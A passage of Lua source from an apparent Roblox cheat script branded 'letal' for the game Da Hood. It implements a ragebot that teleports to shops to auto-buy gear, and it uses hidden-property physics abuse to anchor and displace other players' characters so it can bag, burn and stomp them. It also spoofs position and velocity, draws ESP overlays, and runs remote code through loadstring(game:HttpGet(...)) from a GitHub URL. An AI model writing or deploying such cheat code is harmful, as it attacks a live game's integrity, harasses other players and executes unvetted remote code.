    frame.Size, frame.AnchorPoint = UDim2.fromOffset(24, 24), Vector2.new(0.5, 0.5)
    frame.BorderSizePixel, frame.BackgroundColor3 = 0, Options.VisualBackgroundColor.Value
    frame.Parent = imageScreenGui
    local corner = Instance.new('UICorner')
    corner.CornerRadius, corner.Parent = UDim.new(1, 0), frame
    uiStroke = Instance.new('UIStroke')
    uiStroke.Color, uiStroke.Thickness, uiStroke.Parent = Options.VisualStrokeColor.Value, 1.5, frame
    imageLabel = Instance.new('ImageLabel')
    imageLabel.Size, imageLabel.BackgroundTransparency, imageLabel.BorderSizePixel = UDim2.fromScale(1, 1), 1, 0
    imageLabel.Image, imageLabel.ImageColor3, imageLabel.Parent = 'rbxassetid://128540628323761', Options.VisualImageColor.Value, frame
    local imgCorner = Instance.new('UICorner')
    imgCorner.CornerRadius, imgCorner.Parent = UDim.new(1, 0), imageLabel
end

function updateImage(spoofedPos)
    if not Toggles.VisualImage.Value or not Toggles.RagebotEnabled.Value then
        if imageScreenGui then
            imageScreenGui.Enabled = false
        end
        if imageTween then
            imageTween:Cancel()
            imageTween = nil
        end
        return
    end
    if not spoofedPos then
        if imageScreenGui then
            imageScreenGui.Enabled = false
        end
        return
    end
    if not imageScreenGui or not frame then
        createImage()
    end
    local screenPos, onScreen = workspace.CurrentCamera:WorldToScreenPoint(spoofedPos)
    if onScreen and screenPos.Z > 0 then
        imageScreenGui.Enabled = true
        local targetPos = UDim2.fromOffset(screenPos.X, screenPos.Y)
        frame.Position = targetPos
    else
        imageScreenGui.Enabled = false
    end
end

local SavedPosition = nil
local t = tick()
orbitAngle = 0
autobagstates = {
    target = nil,
    active = false,
    startTime = 0,
    attemptNotified = nil,
    downing = false,
    lastBuy = 0,
}
function cleanupAutobag()
    if autobagstates.target and autobagstates.target.Part then
        pcall(function() autobagstates.target.Part.Anchored = false end)
    end
    autobagstates.target = nil
    autobagstates.active = false
    sethiddenproperty(LocalPlayer.Character.HumanoidRootPart, "PhysicsRepRootPart", nil)
    for _, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("Tool") and v.Name:lower():find("bag") then
            v.Parent = LocalPlayer.Backpack
        end
    end
end

function getBags()
    local bags = {}
    for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") and v.Name:lower():find("bag") then table.insert(bags, v) end
    end
    for _, v in ipairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("Tool") and v.Name:lower():find("bag") then table.insert(bags, 1, v) end
    end
    return bags
end
function isBagged(p) return p and p.Character and p.Character:FindFirstChild("Christmas_Sock") end

function hasFF(p) return p and p.Character and p.Character:FindFirstChildOfClass("ForceField") end
connection = RunService.Heartbeat:Connect(function(dt)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local hum = LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
        local currentPosition = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character.HumanoidRootPart.Position or Vector3.zero
        SavedPosition = hrp.CFrame
        local SpoofedPosition = nil
        local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
        local toolHandle = tool and tool:FindFirstChild("Handle")
        local buying = false
	    local character = LocalPlayer.Character
	    local backpack = LocalPlayer.Backpack
        local isKO = KnockCheck(target)
        local doingbag = false
        local tPart = target and target.Character:FindFirstChild("HumanoidRootPart")
     	if isDaHood and Toggles.AutoBagEnabled.Value then
			local bags = getBags()
			local tPart = target.Character:FindFirstChild("HumanoidRootPart")
            if #bags == 0 and not (isBagged(target) or isKo) then
                doingbag = true
				local shop = workspace.Ignored.Shop:FindFirstChild("[BrownBag] - $28")
				if shop and shop:FindFirstChild("Head") then
					LocalPlayer.Character.HumanoidRootPart.CFrame = shop.Head.CFrame
					fireclickdetector(shop:FindFirstChildOfClass("ClickDetector"))
                    showMessage("letal - buying bag", 1)
				end
            elseif tPart then
				if not (isBagged(target) or isKO or hasFF(target)) then
					doingbag = true
					tPart.Anchored = true
					tPart.CFrame = CFrame.new(0, 25, 0)
					sethiddenproperty(hrp, "PhysicsRepRootPart", tPart)
					hrp.CFrame = CFrame.lookAt(tPart.Position + Vector3.new(0, Options.AutoBagHeight.Value or 3, 0), tPart.Position)
					local bagTool = character:FindFirstChildWhichIsA("Tool")
					if not (bagTool and bagTool.Name:lower():find("bag")) then
						bagTool = bags[1]
						bagTool.Parent = character
					end
					bagTool:Activate()
                    showMessage("letal - bagging target", 1)
                else
                    --[[if hasFF(target) then
                        hrp.CFrame = CFrame.new(math.random(-99999, 99999),math.random(-99999, 99999),math.random(-99999, 99999))
                    end]]
					if tPart then
						tPart.Anchored = false
					end
                    if not doingbag then
                        tPart.Anchored = false
                    end
				    sethiddenproperty(LocalPlayer.Character.HumanoidRootPart, "PhysicsRepRootPart", nil)
				    for _, v in pairs(LocalPlayer.Character:GetChildren()) do
				        if v:IsA("Tool") and v.Name:lower():find("bag") then
				            v.Parent = LocalPlayer.Backpack
				        end
				    end
	            end
            end
		end
        -- Velocity Spoofer
        if Toggles.VelocitySpoofer.Value and (not Toggles.DisableWhenTargetKO.Value or not isKO) then
            local oldVel = hrp.AssemblyLinearVelocity
            hrp.AssemblyLinearVelocity = Vector3.new(Options.VelocityX.Value, Options.VelocityY.Value, Options.VelocityZ.Value)
            RunService.RenderStepped:Wait()
            hrp.AssemblyLinearVelocity = oldVel
        end
        if Toggles.RagebotEnabled.Value and not doingbag then
            local character = LocalPlayer.Character
            local backpack = LocalPlayer.Backpack
            if flametoggle and isDaHood and Toggles.FlameHack.Value then
                local hasFlame = character:FindFirstChild("[Flamethrower]") or backpack:FindFirstChild("[Flamethrower]")
                if not hasFlame then
                    local shopItem = workspace.Ignored.Shop:FindFirstChild("[Flamethrower] - $10130")
                    if shopItem and shopItem:FindFirstChild("Head") then
                        buying = true
                        hrp.CFrame = shopItem.Head.CFrame
                        fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                        game:GetService("RunService"):BindToRenderStep("RestoreCFrame", 199, function()
                            hrp.CFrame = SavedPosition
                            game:GetService("RunService"):UnbindFromRenderStep("RestoreCFrame")
                        end)
                        showMessage("letal - buying flamethrower", 1)
                    end
                else
                    local ammoCount = getAmmoCount1("[Flamethrower]")
                    if ammoCount <= 0 then
                        local shopItem = workspace.Ignored.Shop:FindFirstChild("140 [Flamethrower Ammo] - $1126")
                        if shopItem and shopItem:FindFirstChild("Head") then
                            buying = true
                            hrp.CFrame = shopItem.Head.CFrame
                            fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                            game:GetService("RunService"):BindToRenderStep("RestoreCFrame", 199, function()
                                hrp.CFrame = SavedPosition
                                game:GetService("RunService"):UnbindFromRenderStep("RestoreCFrame")
                            end)
                            showMessage("letal - buying flamethrower ammo", 1)
                        end
                    end
                end

                if not buying then
                    local flameTool = backpack:FindFirstChild("[Flamethrower]")
                    if flameTool then flameTool.Parent = character end
                    local currentTool = character:FindFirstChildOfClass("Tool")
                    if currentTool and currentTool.Name ~= "[Flamethrower]" then
                        currentTool.Parent = backpack
                    end
                else
					for _, currentTool in ipairs(character:GetChildren()) do
						if currentTool:IsA("Tool") then
							currentTool.Parent = backpack
						end
					end
                end

				if not buying and target and target.Character and sethiddenproperty then
				    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
				    local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
				    local isForceField = target.Character:FindFirstChildOfClass("ForceField")
			     	local oldpos = hrp.CFrame
				    local myHRP = character:FindFirstChild("HumanoidRootPart")
				    local flameTool = character:FindFirstChild("[Flamethrower]")
				
				    if targetHRP and myHRP and humanoid and not isKO and not isForceField then
				        targetHRP.Anchored = true
				        targetHRP.CFrame = CFrame.new(99999, 99999, 99999)
				        local pos = targetHRP.Position + Vector3.new(0, 20, 0)

						SpoofedPosition = CFrame.new(pos)
						do
						    local humanoid = character:FindFirstChildOfClass("Humanoid")
						    if humanoid then
						        for _, anim in ipairs(humanoid:GetPlayingAnimationTracks()) do
						            anim:Stop()
						        end
						 
						        -- PLAY anim đứng (R6 và R15 đều fit)
						        local standAnim = Instance.new("Animation")
						        standAnim.AnimationId = "rbxassetid://0"  -- Stand idle animation
						        local track = humanoid:LoadAnimation(standAnim)
						        track:Play()
						        track:AdjustSpeed(0)
						    end
						end
				        sethiddenproperty(myHRP, "PhysicsRepRootPart", targetHRP)
				
				        if flameTool and flameTool:FindFirstChild("Handle") then
				            flameTool:Activate()
				        end
				
				        showMessage("letal - Flame Hacking " .. target.DisplayName, 1)
				    else
                        sethiddenproperty(myHRP, "PhysicsRepRootPart", nil)
						do
							local humanoid = character:FindFirstChildOfClass("Humanoid")
							if humanoid then
						
								for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
									track:Stop()
								end
							end
						end
                    end
                end
            else
                if next(Options.AutoBuy.Value) and isDaHood then
                    for gun, _ in pairs(Options.AutoBuy.Value) do
                        local hasGun = LocalPlayer.Character:FindFirstChild(gun) or LocalPlayer.Backpack:FindFirstChild(gun)
                        if ShopTable[gun] and not hasGun then
                            local shopItem = workspace.Ignored.Shop:FindFirstChild(ShopTable[gun].ShopName)
                            if shopItem and shopItem:FindFirstChild("Head") then
                                buying = true
                                hrp.CFrame = shopItem.Head.CFrame
                                fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                                game:GetService("RunService"):BindToRenderStep("RestoreCFrame", 199, function()
                                    hrp.CFrame = SavedPosition
                                    game:GetService("RunService"):UnbindFromRenderStep("RestoreCFrame")
                                end)
                                showMessage("letal - buying gun", 1)
                                break
                            end
                        end
                        if hasGun then
                            local ammoCount = getAmmoCount1(gun)
                            if ammoCount <= 0 then
                                local gunName = gun:sub(2, -2)
                                local ammoName = "[" .. gunName .. " Ammo]"
                                if ShopTable[ammoName] then
                                    local shopItem = workspace.Ignored.Shop:FindFirstChild(ShopTable[ammoName].ShopName)
                                    if shopItem and shopItem:FindFirstChild("Head") then
                                        buying = true
                                        if LocalPlayer.Character:FindFirstChild(gun) then
                                            LocalPlayer.Character[gun].Parent = LocalPlayer.Backpack
                                        end
                                        hrp.CFrame = shopItem.Head.CFrame
                                        fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                                        game:GetService("RunService"):BindToRenderStep("RestoreCFrame", 199, function()
                                            hrp.CFrame = SavedPosition
                                            game:GetService("RunService"):UnbindFromRenderStep("RestoreCFrame")
                                        end)
                                        showMessage("letal - buying ammo", 1)
                                        break
                                    end
                                end
                            end
                        end
                    end
                end
            end
            if Toggles.AutoArmor.Value and LocalPlayer.Character.BodyEffects and LocalPlayer.Character.BodyEffects.Armor and LocalPlayer.Character.BodyEffects.Armor.Value < 100 then
                local shopItem = workspace.Ignored.Shop:FindFirstChild('[High-Medium Armor] - $2589')
                if shopItem and shopItem:FindFirstChild("Head") then
                    buying = true
                    hrp.CFrame = shopItem.Head.CFrame
                    fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                    game:GetService("RunService"):BindToRenderStep("RestoreCFrame", 199, function()
                        hrp.CFrame = SavedPosition
                        game:GetService("RunService"):UnbindFromRenderStep("RestoreCFrame")
                    end)
                    showMessage("letal - buying armor", 1)
                    return
                end
            end
			if isDaHood then 
				if not buying then
					if not Toggles.FlameHack.Value then
						for gun, _ in pairs(Options.AutoBuy.Value) do
							local gunTool = LocalPlayer.Backpack:FindFirstChild(gun)
							if gunTool then
								gunTool.Parent = LocalPlayer.Character
							end
						end
					end
				else
					for _, currentTool in ipairs(character:GetChildren()) do
						if currentTool:IsA("Tool") then
							currentTool.Parent = backpack
						end
					end
				end
			end
            if buying then return end
            if MainEvent and tool and tool:FindFirstChild("Ammo") and tool.Ammo.Value == 0 then
                MainEvent:FireServer("Reload", tool)
            end
            if target and target.Character then
                local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
                local bodyEffects = target.Character:FindFirstChild("BodyEffects")
                local isDead = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects.SDeath.Value
                local isForceField = target.Character:FindFirstChildOfClass("ForceField")

                if isForceField then
                    SpoofedPosition = CFrame.new(Vector3.new(math.random(-99999, 99999), math.random(0, 99999), math.random(-99999, 99999)))
                    showMessage("letal - Waiting.. Target has spawn protection.", 1)
                    MainEvent:FireServer("Reload", tool)
                elseif isKO and Toggles.AutoStomp.Value and LocalPlayer.Character.BodyEffects.Reload.Value == false then
                    if not isDead then
                        SpoofedPosition = CFrame.new(target.Character.UpperTorso.Position + Vector3.new(0, 3, 0))
                        showMessage("letal - Attempted to Stomp Target: " .. target.Name, 1)
                        if MainEvent then MainEvent:FireServer("Stomp") end
                    end
                elseif isDead or (isKO and not Toggles.AutoStomp.Value) then
                    SpoofedPosition = CFrame.new(Vector3.new(math.random(-99999, 99999), math.random(0, 99999), math.random(-99999, 99999)))
                    showMessage(isDead and "letal - Waiting.. Target is currently dead." or "letal - Waiting.. Target is currently knocked.", 1)
                    MainEvent:FireServer("Reload", tool)
                else
                    if not (flametoggle and isDaHood and Toggles.FlameHack.Value) then
                        local targetPos = targetHRP.Position
                        local maxCoord = math.max(math.abs(targetPos.X), math.abs(targetPos.Y), math.abs(targetPos.Z))

                        if Toggles.BypassVoid.Value and (math.abs(targetPos.X) > 7000 or math.abs(targetPos.Y) > 7000 or math.abs(targetPos.Z) > 7000) then
                            SpoofedPosition = CFrame.new(Vector3.new(math.cos(tick()*2)*1000, math.random(50,150), math.sin(tick()*2)*1000))
                            showMessage("letal - target in void (stop tp to target)", 1)
                        else
                            if Toggles.IdleSpam.Value then
                                if inVoid then
                                    SpoofedPosition = CFrame.new(Vector3.new(math.random(-99999, 99999), math.random(0, 99999), math.random(-99999, 99999)))
                                    showMessage("letal - idle spam phase (" .. activetime .. "s).", 1)
                                else
                                    -- Dynamic orbit theo khoảng cách
                                    if maxCoord < 1000 then
                                        SpoofedPosition = CFrame.lookAt(currentPosition + Vector3.new(math.cos(tick() * 10) * 10, 0, math.sin(tick() * 10) * 10), currentPosition)
                                    elseif maxCoord < 10000 then
                                        orbitAngle = orbitAngle + 2.5
                                        local dist = 30 + math.sin(orbitAngle * 50) * 20
                                        local height = math.abs(math.sin(orbitAngle * 45)) * 80
                                        SpoofedPosition = CFrame.lookAt(currentPosition + Vector3.new(math.sin(orbitAngle * 7) * dist, height, math.cos(orbitAngle * 7) * dist), currentPosition)
                                    else
                                        local v242 = orbitAngle * 35
                                        local dist = 40 + math.sin(v242 * 3) * 25
                                        local height = math.sin(v242 * 8) * 100 - 30
                                        SpoofedPosition = CFrame.lookAt(currentPosition + Vector3.new(math.sin(v242) * dist * 1.5, height, math.cos(v242) * dist * 1.5), currentPosition)
                                    end
                                    showMessage("letal - Target Phase (" .. inactivetime .. "): Strafing " .. target.DisplayName .. " (@" .. target.Name .. ")", 1)
                                end
                            else
                                -- Normal dynamic orbit
                                if maxCoord < 700 then
                                    SpoofedPosition = CFrame.lookAt(currentPosition + Vector3.new(math.cos(tick() * 10) * 10, 0, math.sin(tick() * 10) * 10), currentPosition)
                                elseif maxCoord < 10000 then
                                    orbitAngle = orbitAngle + 2.5
                                    local dist = 30 + math.sin(orbitAngle * 50) * 20
                                    local height = math.abs(math.sin(orbitAngle * 45)) * 80
                                    SpoofedPosition = CFrame.lookAt(currentPosition + Vector3.new(math.sin(orbitAngle * 7) * dist, height, math.cos(orbitAngle * 7) * dist), currentPosition)
                                else
                                    local v242 = orbitAngle * 35
                                    local dist = 40 + math.sin(v242 * 3) * 25
                                    local height = math.sin(v242 * 8) * 100 - 30
                                    SpoofedPosition = CFrame.lookAt(currentPosition + Vector3.new(math.sin(v242) * dist * 1.5, height, math.cos(v242) * dist * 1.5), currentPosition)
                                end
                                local inVoidCheck = math.abs(targetPos.X) > 2000 or math.abs(targetPos.Y) > 2000 or math.abs(targetPos.Z) > 2000
                                showMessage("letal - Strafing: " .. target.DisplayName .. " (@" .. target.Name .. ") in " .. (inVoidCheck and "void" or "map"), 1)
                            end
                        end
                    end
                end
            else
                SpoofedPosition = CFrame.new(Vector3.new(math.random(-99999, 99999), math.random(0, 99999), math.random(-99999, 99999)))
                showMessage("letal - Target not found. (hiding void)", 3)
            end

            if SpoofedPosition then
                hrp.CFrame = SpoofedPosition
            end
            if Toggles.Spoof.Value then
                game:GetService("RunService"):BindToRenderStep("RestoreCFrame", 199, function()
                    hrp.CFrame = SavedPosition
                    game:GetService("RunService"):UnbindFromRenderStep("RestoreCFrame")
                end)
            end
            updateImage(SpoofedPosition and SpoofedPosition.Position or Vector3.zero)
        else 
			textLabel.Text = ""
			textLabel.TextTransparency = 1
			if currentTween then currentTween:Cancel() currentTween = nil end
			if imageScreenGui then imageScreenGui:Destroy() imageScreenGui = nil end
		end
    else
        textLabel.Text = ""
        textLabel.TextTransparency = 1
        if currentTween then currentTween:Cancel() currentTween = nil end
        if imageScreenGui then imageScreenGui:Destroy() imageScreenGui = nil end
    end
end)
local selectedPlayer = nil

PlayerListBox:AddDropdown("SelectedPlayer", {
    SpecialType = "Player",         
    ExcludeLocalPlayer = true,       
	Searchable = true,
    Text = "Select Player",
    Callback = function(Value)
        selectedPlayer = Value     
    end,
})

PlayerListBox:AddButton("Set Target", function()
    if selectedPlayer then
        target = selectedPlayer
    end
end)

PlayerListBox:AddButton("Teleport to Target", function()
    if selectedPlayer 
       and selectedPlayer.Character 
       and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local localHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if localHRP then
            localHRP.CFrame = selectedPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
        end
    end
end)

do
    if isDaHood then 
		local crosshairbox = Tabs.General:AddRightGroupbox("Crosshair")
		local spinConnection = nil
		local spinSpeed = 10
		local plr = Players.LocalPlayer
		crosshairbox:AddToggle('CursorSpin', {
			Text = 'Spinning Cursor',
			Default = false,
			Callback = function(value)
				if value then
					if spinConnection then
						spinConnection:Disconnect()
					end
		
					spinConnection = game:GetService('RunService').RenderStepped:Connect(function(deltaTime)
						if not Toggles.CursorSpin.Value then
							return
						end
		
						local aimGui = plr.PlayerGui:FindFirstChild('MainScreenGui')
		
						if aimGui then
							local aim = aimGui:FindFirstChild('Aim')
		
							if aim then
								aim.Rotation = (aim.Rotation + (spinSpeed * deltaTime * 60)) % 360
							end
						end
					end)
				else
					if spinConnection then
						spinConnection:Disconnect()
		
						spinConnection = nil
					end
		
					local aimGui = plr.PlayerGui:FindFirstChild('MainScreenGui')
		
					if aimGui and aimGui:FindFirstChild('Aim') then
						aimGui.Aim.Rotation = 0
					end
				end
			end,
		})
		crosshairbox:AddSlider('CursorSpinSpeed', {
			Text = 'Spin Speed',
			Min = 1,
			Max = 100,
			Default = 10,
			Rounding = 1,
			Callback = function(value)
				spinSpeed = value
			end,
		})
	end
end
local ESPBox = Tabs.General:AddLeftGroupbox("ESP")
local MatchaEsp = loadstring(game:HttpGet('https://raw.githubusercontent.com/alebinh60/asmobile/refs/heads/main/esplib'))()
local esp = MatchaEsp

-- Box ESP
ESPBox:AddToggle('BoxESPToggle', {
    Text = 'Box ESP',
    Default = false,
    Callback = function(Value)
        esp.State.BoxEnabled = Value
    end,
}):AddColorPicker('BoxColorPicker', {
    Default = Color3.new(0.403922, 0.349020, 0.701961),
    Title = 'Box Color',
    Callback = function(Value)
        esp.Config.BoxColor = Value
        for _, espObj in pairs(esp.Caches.BoxCache) do
            espObj.Box.Color = Value
        end
    end,
})

-- Box Gradient Toggle
ESPBox:AddToggle('BoxGradientToggle', {
    Text = 'Box Gradient',
    Default = false,
    Callback = function(Value)
        esp.Config.BoxGradientEnabled = Value
    end,
}):AddColorPicker('BoxGradientColor1', {
    Default = Color3.new(0.403922, 0.34902, 0.701961),
    Title = 'Gradient Color 1',
    Callback = function(Value)
        esp.Config.BoxGradientColor1 = Value
        for _, espObj in pairs(esp.Caches.BoxCache) do
            espObj.Gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, esp.Config.BoxGradientColor1),
                ColorSequenceKeypoint.new(0.5, esp.Config.BoxGradientColor2),
                ColorSequenceKeypoint.new(1, esp.Config.BoxGradientColor1)
            })
        end
    end,
}):AddColorPicker('BoxGradientColor2', {
    Default = Color3.new(0.8, 0.4, 1),
    Title = 'Gradient Color 2',
    Callback = function(Value)
        esp.Config.BoxGradientColor2 = Value
        for _, espObj in pairs(esp.Caches.BoxCache) do
            espObj.Gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, esp.Config.BoxGradientColor1),
                ColorSequenceKeypoint.new(0.5, esp.Config.BoxGradientColor2),
                ColorSequenceKeypoint.new(1, esp.Config.BoxGradientColor1)
            })
        end
    end,
})

ESPBox:AddSlider('BoxFillTransparencySlider', {
    Text = 'Box Fill Transparency',
    Default = 0.5,
    Min = 0,
    Max = 1,
    Rounding = 2,
    Compact = true,
    Callback = function(Value)
        esp.Config.BoxFillTransparency = Value
        for _, espObj in pairs(esp.Caches.BoxCache) do
            espObj.FillFrame.BackgroundTransparency = Value
        end
    end,
})

-- Box Outline
ESPBox:AddToggle('BoxOutlineToggle', {
    Text = 'Box Outline',
    Default = true,
    Callback = function(Value)
        esp.Config.BoxOutlineEnabled = Value
        for _, espObj in pairs(esp.Caches.BoxCache) do
            espObj.Stroke.Enabled = Value
            espObj.BoxOutline.Visible = Value and not esp.Config.BoxGradientEnabled
        end
    end,
}):AddColorPicker('BoxOutlineColor', {
    Default = Color3.new(0, 0, 0),
    Title = 'Outline Color',
    Callback = function(Value)
        esp.Config.BoxOutlineColor = Value
        for _, espObj in pairs(esp.Caches.BoxCache) do
            espObj.Stroke.Color = Value
            espObj.BoxOutline.Color = Value
        end
    end,
})

-- Ring ESP
ESPBox:AddToggle('RingESPToggle', {
    Text = 'Ring ESP',
    Default = false,
    Callback = function(Value)
        if Value then
            esp:InitiateRing(Color3.new(1, 1, 1))
        else
            esp.State.RingEnabled = false
        end
    end,
}):AddColorPicker('RingColorPicker', {
    Default = Color3.new(1, 1, 1),
    Title = 'Ring Color',
    Callback = function(Value)
        esp.Config.RingColor = Value
        for _, data in pairs(esp.Caches.RingCache) do
            data.Ring.Color3 = Value
        end
    end,
})

-- Name ESP
ESPBox:AddToggle('NameESPToggle', {
    Text = 'Name ESP',
    Default = false,
    Callback = function(Value)
        esp:InitiateName(Value)
    end,
})

-- Distance ESP
ESPBox:AddToggle('DistanceESPToggle', {
    Text = 'Distance ESP',
    Default = false,
    Callback = function(Value)
        esp:InitiateDistance(Value)
    end,
})

-- Skeleton ESP
ESPBox:AddToggle('SkeletonESPToggle', {
    Text = 'Skeleton ESP',
    Default = false,
    Callback = function(Value)
        if Value then
            esp:InitiateSkeleton(Color3.new(0.403922, 0.349020, 0.701961))
        else
            esp.State.SkeletonEnabled = false
        end
    end,
}):AddColorPicker('SkeletonColorPicker', {
    Default = Color3.new(0.403922, 0.349020, 0.701961),
    Title = 'Skeleton Color',
    Callback = function(Value)
        esp.Config.SkeletonColor = Value
        for _, skeleton in pairs(esp.Caches.SkeletonCache) do
            for _, line in pairs(skeleton) do
                line.Color = Value
            end
        end
    end,
})

-- Health Bar ESP
ESPBox:AddToggle('HealthBarESPToggle', {
    Text = 'Health Bar',
    Default = false,
    Callback = function(Value)
        esp.State.HealthBarEnabled = Value
    end,
})

--[[ESPBox:AddToggle('ArmorBarESPToggle', {
    Text = 'Armor Bar',
    Default = false,
    Callback = function(Value)
        esp.State.ArmorBarEnabled = Value
    end,
})]]

-- Health Text ESP
ESPBox:AddToggle('HealthTextESPToggle', {
    Text = 'Health Text',
    Default = false,
    Callback = function(Value)
        esp.State.HealthTextEnabled = Value
    end,
})

-- Tracer ESP
ESPBox:AddToggle('TracerESPToggle', {
    Text = 'Tracer ESP',
    Default = false,
    Callback = function(Value)
        if Value then
            esp:InitiateTracer(Color3.new(0.403922, 0.349020, 0.701961), esp.Config.TracerOrigin)
        else
            esp.State.TracerEnabled = false
        end
    end,
}):AddColorPicker('TracerColorPicker', {
    Default = Color3.new(0.403922, 0.349020, 0.701961),
    Title = 'Tracer Color',
    Callback = function(Value)
        esp.Config.TracerColor = Value
        for _, tracer in pairs(esp.Caches.TracerCache) do
            tracer.Color = Value
        end
    end,
})
ESPBox:AddDropdown('TracerOriginDropdown', {
    Text = 'Tracer Origin',
    Default = 'Bottom Screen',
    Values = {'Bottom Screen', 'Cursor', 'Top Screen'},
    Compact = true,
    Callback = function(Value)
        esp.Config.TracerOrigin = Value
    end,
})

-- Chams ESP
ESPBox:AddToggle('ChamsToggle', {
    Text = 'Chams',
    Default = false,
    Callback = function(Value)
        if Value then
            esp:InitiateChams(Color3.new(0.403922, 0.34902, 0.701961))
        else
            esp.State.ChamsEnabled = false
        end
    end,
}):AddColorPicker('ChamsColorPicker', {
    Default = Color3.new(0.403922, 0.34902, 0.701961),
    Title = 'Fill Color',
    Callback = function(Value)
        esp.Config.ChamsColor = Value
        for _, chams in pairs(esp.Caches.ChamsCache) do
            chams.FillColor = Value
        end
    end,
}):AddColorPicker('ChamsOutlineColorPicker', {
    Default = Color3.new(1, 1, 1),
    Title = 'Outline Color',
    Callback = function(Value)
        esp.Config.ChamsOutlineColor = Value
        for _, chams in pairs(esp.Caches.ChamsCache) do
            chams.OutlineColor = Value
        end
    end,
})
ESPBox:AddSlider('ChamFillTransparency', {
    Text = 'Chams Transparency',
    Default = 0.5,
    Min = 0,
    Max = 1,
    Rounding = 2,
    Compact = true,
    Callback = function(Value)
        esp.Config.ChamsFillTransparency = Value
        for _, chams in pairs(esp.Caches.ChamsCache) do
            chams.FillTransparency = Value
        end
    end,
})


-- ESP Distance
ESPBox:AddSlider('ESPDistanceSlider', {
    Text = 'ESP Distance',
    Default = 1000,
    Min = 100,
    Max = 10000,
    Rounding = 0,
    Suffix = ' studs',
    Compact = true,
    Callback = function(Value)
        esp:SetDistance(Value)
    end,
})
-- Initialize ESP
esp:Initialize()

local VisualBox = Tabs.General:AddRightTabbox() 

local CharacterTab = VisualBox:AddTab("Character")
local WorldTab = VisualBox:AddTab("World")
originalCharacterColors = {}
originalToolColors = {}
local letal = {}
letal.SelfVisuals = {
    Aura = false,
    AuraColor = Color3.fromRGB(154, 125, 175),
    WalkSteps = false,
    WalkStepsRate = 7,
    WalkStepsSize = NumberSequence.new(0, 0.25, 0, 0.5, 1.5, 0, 1, 2, 0),
    WalkStepsColor = Color3.fromRGB(154, 125, 175),
}
local UserID = 133827245

CharacterTab:AddToggle("AvatarChanger", {
    Text = "Avatar Changer",
    Default = false,
    Risky = true,
    Callback = function(Value)
        if Players.LocalPlayer.Character.Humanoid.HumanoidDescription.RightArm == 0 then
            if Value then
                for _, item in pairs(Players.LocalPlayer.Character:GetChildren()) do
                    if item:IsA("Shirt") or item:IsA("Pants") or item:IsA("Accessory") then
                        item:Destroy()
                    end
                end
            
                Players.LocalPlayer.Character.Humanoid:ApplyDescriptionClientServer(Players:GetHumanoidDescriptionFromUserId(UserID))
            else
                Players.LocalPlayer.Character.Humanoid:ApplyDescriptionClientServer(Players:GetHumanoidDescriptionFromUserId(Players.LocalPlayer.UserId))
            end
        else
            Library:Notify("letal - 'Avatar Changer' Module requires you to use the 'Blocky / Default Packages' Right Arm. Please change your avatar.")
        end
    end
})

CharacterTab:AddDropdown("AvatarSelect", {
    Values = {"anhchangm52", "tongtaiphongcach", "bodygrave", "asdfxdheh", "tul"},
    Default = "bodygrave",
    Multi = false,
    Text = "Avatar",
    Callback = function(Value)
        if Value == "anhchangm52" then
            UserID = 9029523796
        elseif Value == "tongtaiphongcach" then
            UserID = 7872018711
        elseif Value == "bodygrave" then
            UserID = 133827245
        elseif Value == "asdfxdheh" then
            UserID = 2611320910
        elseif Value == "tul" then
            UserID = 2547639113
        end
    end
})

CharacterTab:AddToggle("CharacterEnabled", {
    Text = "Character",
    Default = false,
    Callback = function(Value)
        letal.SelfVisuals.Character = Value
        if Value == false then
            for _, part in ipairs(Players.LocalPlayer.Character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Material = Enum.Material.Plastic
                end
            end
            ResetCharacterColors()
        end
    end
}):AddColorPicker("CharacterColor", {
    Default = Color3.new(1, 1, 1),
    Title = "Main Color",
})

CharacterTab:AddDropdown("CharacterMaterial", {
    Values = {"ForceField", "Neon", "Plastic", "SmoothPlastic", "Wood", "WoodPlanks", "Marble", "Slate", "Concrete", "Granite", "Brick", "Pebble", "Cobblestone", "Rock", "DiamondPlate", "Metal", "CorrodedMetal", "Foil", "Grass", "Sand", "Fabric", "Ice", "Glass", "Asphalt", "LeafyGrass", "Salt", "Snow", "Mud", "Ground", "Basalt", "CrackedLava"},
    Default = "ForceField",
    Multi = false,
    Text = "Character Material",
})

CharacterTab:AddToggle("ToolEnabled", {
    Text = "Tool",
    Default = false,
    Callback = function(Value)
        letal.SelfVisuals.Tool = Value
        if Value == false and Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
            for _, part in ipairs(Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):GetChildren()) do
                if part:IsA("BasePart") then
                    part.Material = Enum.Material.Plastic
                end
            end
            ResetToolColors()
        end
    end
}):AddColorPicker("ToolColor", {
    Default = Color3.new(1, 1, 1),
    Title = "Main Color",
})

CharacterTab:AddDropdown("ToolMaterial", {
